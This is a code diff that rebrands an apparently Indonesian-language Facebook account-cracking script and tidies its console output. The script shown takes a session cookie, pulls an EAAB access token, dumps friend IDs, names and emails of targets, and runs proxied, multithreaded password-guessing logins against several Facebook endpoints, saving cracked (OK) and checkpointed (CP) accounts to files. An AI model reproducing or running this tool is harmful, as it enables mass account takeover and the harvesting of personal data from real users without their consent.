@@ -56,12 +56,13 @@ x = '\33[m' # DEFAULT
 asu = random.choice([m,k,h,u,b])  
 
 dump, dump2, news = [], [], []
+sys.stdout.write('{H}RR07X |{M} @Khoirulez')
 
 class REQ:
    
    def __init__(self):
        self.ses = requests.Session()
-       self.url = "https://github.com/AdityaTwinz"
+       self.url = "https://github.com/khoirulez"
        self.OS_mkdir()
    
    def OS_mkdir(self):
@@ -121,6 +122,7 @@ class REQ:
        return App_get
               
    def Logooo(self):
+       Console().print(f"{asu}RR07X{x} | {asu}@Khoirulez{N}")
        Console().print(f' {M2}● {K2}● {H2}●')
        Console().print(f'''    {H2}    ,*-~"`^"*u_                                _u*. "^`"~-*,
      p!^       /  jPw                            w9j \        ^!p
@@ -160,7 +162,7 @@ class REQ:
 
    def REQ_Cookie(self):
        self.clearTerminal(platform) ; self.Logooo()
-       Cooks = Console().input(f'\n[•] {M2}Masukan Cookie{N} : {H2} ')
+       Cooks = Console().input(f'\n{M2}Masukan Cookie{N} : {H2}')
        try:
            askTrue = self.ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {'cookie':Cooks})
            search = re.search('act=(.*?)&nav_source',str(askTrue.content)).group(1)
@@ -169,13 +171,13 @@ class REQ:
            open('DataLog/cookies.txt','w').write(Cooks)
            open('DataLog/tokenEaab.txt','w').write(dashToken)
            self.Followers(Cooks) ; self.Followers2(Cooks)
-           Console().print(Markdown("[•]{U} Login token EAAB berhasil{x} :")
+           Console().print("[•]{U2} Login token EAAB berhasil{x} :")
            Console().print(f'{H2}{dashToken}') ; sleep(3.1)
-           Console().print(Markdown(f"[•]{U} Silahkan jalankan ulang scirptnya") ; sleep(3.1) ; sys.exit()
+           Console().print(f"[•]{U2} Silahkan jalankan ulang scirptnya") ; sleep(3.1) ; sys.exit()
        except requests.exceptions.ConnectionError as e:
-           Console().print(Markdown(f"[•]{U} {str(e).title()}") ; sleep(3.1) ; sys.exit()
+           Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
        except Exception as e:
-           Console().print(Markdown(f"[•]{U} {str(e).title()}") ; sleep(3.1) ; self.REQ_Cookie()
+           Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; self.REQ_Cookie()
    
    def Followers(self, cok):
        try:
@@ -199,31 +201,31 @@ class REQ:
            coks = open('DataLog/cookies.txt','r').read()
            toks = open('DataLog/tokenEaab.txt','r').read()
        except FileNotFoundError as e:
-           Console().print(Markdown(f"[•]{U} {str(e).title()}") ; sleep(3.1) ; self.REQ_Cookie()
+           Console().print(Markdown(f"[•]{U2} {str(e).title()}"),style='red') ; sleep(3.1) ; self.REQ_Cookie()
        try:
            url = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={toks}", cookies = {"cookie": coks}).json()
            nama, id = url['name'], url['id']
        except (KeyError, NameError) as e:
-           Console().print(Markdown(f"[•]{U} {str(e).title()}") ; sleep(3.1) ; self.DEL_Cok() ; self.REQ_Cookie()
+           Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; self.DEL_Cok() ; self.REQ_Cookie()
        except requests.exceptions.ConnectionError as e:
-           Console().print(Markdown(f"[•]{U} {str(e).title()}") ; sleep(3.1) ; sys.exit()
-       Console().print(Markdown(f"[•]{U}Your Tumbal Name {M}{nama} {U}And Uid {B}{id}")
-       Console().print(f'\n{H2}01{P2}. {U2}Crack publik\n{H2}02{P2}. {U2}Crack massal\n{H2}03{P2}. {U2}Crack email\n{H2}04{P2}. {U2}Crack file\n{H2}05{P2}. {U2}Result OK/CP\n{M2}00{P2}. {U2}Log-out{x} ( {M2}Cookie{x} )')
-       ykhh = Console().input(f'\n {M2}Input{N} : ')
+           Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
+       Console().print(f"[•]{U}Your Tumbal Name {M}{nama} {U2}And Uid {B}{id}")
+       Console().print(f'\n{H2}01{P2}. {U2}Crack publik\n{H2}02{P2}. {U2}Crack massal\n{H2}03{P2}. {U2}Crack email\n{H2}04{P2}. {U2}Crack file\n{H2}05{P2}. {U2}Result OK/CP\n{M2}00{P2}. {U2}Log-out ( {M2}Cookie{x} )')
+       ykhh = Console().input(f'\n{M2}Input{N} : ')
        
        if ykhh =='1' or ykhh =='01':
-         uid = Console().input(f'\n {M2}Masukan Id Target{N} : ')
+         uid = Console().input(f'\n{M2}Masukan Id{N} : ')
          data = {'access_token':toks, 'after':None}
          url = 'https://graph.facebook.com/v18.0/%s/friends'
-         Console().print(Markdown(f"[•]{U2} Sedang dump id {B}{uid}") ; print('\r') ; sleep(3.3)
+         Console().print(f"[•]{U2} Sedang dump id {uid}") ; print('\r') ; sleep(3.3)
          for xxx in uid.split(','):
              Dump().Publik(data, url, xxx, dump, coks)
          print('')
          Furthermore().Methodee()
        
        elif ykhh =='2' or ykhh =='02':
-           Console().print(Markdown(f"[•]{U2} Masukan id target, banyaknya id pisahkan dengan "," ( koma )"),style='thistle1')
-           uid = Console().input(f'\n {M2}Masukan Id Target{N} : ')
+           Console().print(f"[•]{U2} Masukan id target, banyaknya id pisahkan dengan "," ( koma )")
+           uid = Console().input(f'\n{M2}Masukan Id{N} : ')
            for uuid in uid:
                 try:
                     with requests.Session() as r:
@@ -235,58 +237,58 @@ class REQ:
        
        elif ykhh =='3' or ykhh =='03':
            try:
-                 nama = Console().input(f'\n {M2}Masukan Nama Target{N} : ')
-                 total = Console().input(f'\n {M2}Masukan Jumlah Target : ')
+                 nama = Console().input(f'\n{M2}Masukan Nama Target{N} : ')
+                 total = Console().input(f'\n{M2}Masukan Jumlah Dump{N} : ')
                  print('')
                  Dump().Dump_Email(nama, total)
            except Exception as e:
-                 Console().print(Markdown(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
+                 Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
            print('')
            Furthermore().Methodee()
        
        elif ykhh =='4' or ykhh =='04':
            try:
-                Files = Console().input(f'\n {M2} Masukan tempat file anda{x} ({B}ex: /sdcard/dump.txt) : ')
+                Files = Console().input(f'\n{M2}Masukan tempat file anda (ex: /sdcard/dump.txt) : ')
                 print('')    
                 Dump().Dump_File(Files)   
            except Exception as e:
-                Console().print(Markdown(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
+                Console().print(f"## {str(e).title()}") ; sleep(3) ; sys.exit()
            print('')
            Furthermore().Methodee()
        
        elif ykhh =='5' or ykhh =='05':
            Console().print(f'\n{H2}01{P2}. Check hasil OK\n{H2}02{P2}. Check hasil CP\n{H2}03{P2}. Kembali ke menu')
-           aa = Console().input(f'\n {M2}Input{N} : ')
+           aa = Console().input(f'\n{M2}Input{N} : ')
            
            if aa =='1' or aa =='01':
              try:
                  yyy = open("Results/ok.txt", "r").readlines()
              except FileNotFoundError as e:
-                 Console().print(Markdown(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
+                 Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
              for i in yyy:
                  tree = Tree(f"\r",guide_style="bold grey100")
                  tree.add(f'{H2}{i}')
                  prints(tree)
-             Console().print(Markdown(f"[•]{U2} Check hasil ok selesai") ; sleep(3) ; sys.exit()
+             Console().print(f"[•]{U2} Check hasil ok selesai") ; sleep(3) ; sys.exit()
            
            elif aa =='2' or aa =='02':
                try:
                    yyy = open("Results/cp.txt", "r").readlines()
                except FileNotFoundError as e:
-                   Console().print(Markdown(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
+                   Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
                for i in yyy:
                    tree = Tree(f"\r",guide_style="bold grey100")
                    tree.add(f'{K2}{i}')
                    prints(tree)
-               Console().print(Markdown(f"[•]{U2} Check hasil cp selesai") ; sleep(3) ; sys.exit()
+               Console().print(f"[•]{U2} Check hasil cp selesai") ; sleep(3) ; sys.exit()
            
            elif aa =='3' or aa =='03':
                self.Menuuu()
            
-           else:Console().print(Markdown(f"[•]{U2} Input dengan benar") ; sleep(3) ; self.Menuuu()
+           else:Console().print(f"[•]{U2} Input dengan benar") ; sleep(3) ; self.Menuuu()
        
        elif ykhh =='0' or ykhh =='00':
-           self.DEL_Cok() ; Console().print(Markdown(f"[•]{U2} Berhasil menghapus cookie & token") ; sleep(3) ; sys.exit()
+           self.DEL_Cok() ; Console().print(f"[•]{U2} Berhasil menghapus cookie & token") ; sleep(3) ; sys.exit()
          
 
 class Dump:
@@ -301,7 +303,7 @@ class Dump:
            for xyz in req['data']:
                uid = '%s|%s'%(xyz['id'],xyz['name'])
                if uid not in array:array.append(uid)
-               Console().print(f' {M2}Total Dump{N} -: {B2}{len(array)}{P2}',end='\r')
+               Console().print(f'{M2}Total Dump{N} -: {B2}{len(array)}{P2}',end='\r')
            if 'paging' in str(req):
               after = req['paging']['cursors']['after']
               params.update({'after': after})
@@ -333,7 +335,7 @@ class Dump:
                             continue
                         else:
                             dump.append(f'{self.id_friends}|{self.name}')
-                            Console().print(f' {M2}Total Dump{N} -: {K2}{len(dump)}{P2}',end='\r')
+                            Console().print(f'{M2}Total Dump{N} -: {K2}{len(dump)}{P2}',end='\r')
                 if 'Sorry, something went wrong.' in str(response):
                     return False
                 elif 'unit_cursor=' in str(response):
@@ -342,7 +344,7 @@ class Dump:
                 else:
                     return False
         except KeyboardInterrupt as e:
-            Console().print(Markdown(f"[•]{U2} {str(e).title()}")
+            Console().print(f"[•]{U2} {str(e).title()}")
             return False
    
    def Dump_Email(self, nama, total):
@@ -374,9 +376,9 @@ class Dump:
                     self.id = nama
                     self.nama = data 
                     dump.append(data+'|'+nama)
-                    Console().print(f' {M2}Total Dump{N} -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
+                    Console().print(f'{M2}Total Dump{N} -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
         except (KeyboardInterrupt, Exception) as e:
-            Console().print(Markdown(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
+            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
    
    def Dump_File(self, Files):
         try:
@@ -386,10 +388,10 @@ class Dump:
                     user, nama = data.split('|')
                     dump.append(data)
                 except Exception as e:
-                    Console().print(Markdown(f"[•]{U2} {str(e).title()}"),style='red') ; sleep(3.1) ; sys.exit() 
-                Console().print(f' {M2}Total Dump{N} -: {H2}{len(dump)}{P2}',end='\r')
+                    Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit() 
+                Console().print(f'{M2}Total Dum{N} -: {H2}{len(dump)}{P2}',end='\r')
         except FileNotFoundError as e:
-            Console().print(Markdown(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
+            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
 
 class Furthermore:
    
@@ -404,7 +406,7 @@ class Furthermore:
    def Methodee(self):
        Console().print(Markdown(f"## Total {len(dump)} id terkumpul"),style='blue')
        Console().print(f'\n{B2}01{P2}. Methode async ( {H2}m.facebook.com {P2})\n{B2}02{P2}. Methode validate ( {H2}mbasic.facebook.com {P2})\n{B2}03{P2}. Methode Reguler ( {H2}free.facebook.com {P2})\n{B2}04{P2}. Methode asyncAPP ( {H2}m.facebook.com{P2} )\n{B2}05{P2}. Methode validateAPP ( {H2}mbasic.facebook.com{P2} )')
-       Asw = Console().input(f'\n {M2Input{N} : ')
+       Asw = Console().input(f'\n{M2}Input{N} : ')
        if Asw =='1' or Asw =='01':
          self.Method.append('async')
        elif Asw =='2' or Asw =='02':
@@ -420,10 +422,10 @@ class Furthermore:
        self.Wordlist()
    
    def Wordlist(self):
-        ask = Console().input(f'\n[•]{U} Ingin menambahkan sandi manual? (Y/t) ')
+        ask = Console().input(f'\n{M2}Ingin menambahkan sandi manual? (Y/t) ')
         if ask =='y' or ask =='Y' or ask =='Ya' or ask =='ya' or ask =='YA':
           self.Paslist.append('ya')
-          pwdia = Console().input(f'\n [•]{U2}Buat Kata Sandi : ')
+          pwdia = Console().input(f'\n{M2}Buat Kata Sandi{N} : ')
           asky = pwdia.split(',')
           for x in asky:
               self.Passku.append(x)
@@ -431,9 +433,9 @@ class Furthermore:
         self.Generate_id()
    
    def Generate_id(self):
-       Console().print(Markdown(f"[•]{U} Setting userId anda")
+       Console().print(Markdown(f"[•]{U2} Setting userId anda"),style='yellow')
        Console().print(f'\n{K2}01{P2}. Facebook Id old\n{K2}02{P2}. Facebook id new\n{K2}03{P2}. Facebook id random')
-       ykh = Console().input(f'\n {M2}Input{N} : ')
+       ykh = Console().input(f'\n{M2}Input{N} : ')
        
        if ykh =='1' or ykh =='01':
          for old in sorted(dump):
@@ -456,7 +458,7 @@ class Furthermore:
    
    def Generate_List(self):
         global prog,des
-        Console().print(Markdown(f"[•]{U} Start {self.tgl}-{self.bln}-{self.thn} OK/CP") ; print('')
+        Console().print(f"[•]{U2} Start {self.tgl}-{self.bln}-{self.thn} OK/CP") ; print('')
         prog = Progress(TextColumn("{task.description}"))
         des = prog.add_task('',total=len(dump))
         with prog:
@@ -499,12 +501,12 @@ class Furthermore:
                         Itil.submit(self.asyncAPI, user, self.password)
                
         if self.live == 0 and self.check == 0:
-            Console().print(Markdown(f"[•]{U} Opshh anda tidak mendapatkan hasil sama sekali") ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
+            Console().print(f"[•]{U2} Opshh anda tidak mendapatkan hasil sama sekali") ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
         else:
-            Console().print(f'\n[•]{U2} Selamat, Anda Mendapatkan {H2}Hasil OK {H2} {len(self.live)} {U2}Dan {K2}Hasil CP {K2}: {len(self.check)}') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
+            Console().print(f'\n[•]{U2} Selamat, Anda Mendapatkan {U2}Hasil OK {H2} {len(self.live)} {U2}Dan Hasil CP {K2}: {len(self.check)}') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
    
    def asyncAPI(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
        prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
@@ -580,14 +582,14 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def validateAPI(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des)
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des)  
        ses = requests.Session()
        proxx = REQ().get_Proxy()
        ua = REQ().UserAgent_API()
@@ -651,14 +653,14 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def regularAPI(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des)
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des)  
        ses = requests.Session()
        proxx = REQ().get_Proxy()
        ua = REQ().UserAgent()
@@ -718,14 +720,14 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def asyncAPP(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des)
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
        ua = REQ().UserAgent_APP()
@@ -800,14 +802,14 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def validateAPP(self, user, password):
-       prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-       prog.advance(des)
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().UserAgent_APP()
        ua = REQ().UserAgent()
@@ -871,8 +873,8 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f"[{asu}RR07X{x}]  [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
 #----------------------[ LICENSE ]---------------------#
